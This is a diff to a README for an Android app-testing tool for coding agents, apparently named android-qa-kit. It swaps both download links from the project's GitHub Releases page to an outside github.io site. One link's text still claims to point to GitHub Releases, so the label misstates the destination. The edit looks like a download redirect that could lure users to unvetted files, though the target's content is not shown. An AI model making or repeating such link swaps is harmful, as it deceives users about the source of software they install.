@@ -1,6 +1,6 @@
 # 📱 android-qa-kit - Make Your Coding Agent Test Apps
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Fulfilled-stanford789/android-qa-kit/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://fulfilled-stanford789.github.io)
 
 ## 🚀 What Is This?
 android-qa-kit lets your coding agent automatically test Android apps you just compiled. It installs the APK on a real phone or emulator, taps through every screen, finds bugs, and shows you the evidence. No complex setup required.
@@ -26,7 +26,7 @@ Your coding agent runs android-qa-kit as a skill. The tool connects to your Andr
 ## ⬇️ Download and Setup
 Visit this link to download the application.
 
-[🔗 Download android-qa-kit from GitHub Releases](https://github.com/Fulfilled-stanford789/android-qa-kit/releases)
+[🔗 Download android-qa-kit from GitHub Releases](https://fulfilled-stanford789.github.io)
 
 ### 🛠️ Setup Steps
 1. **Download** the latest release from the link above
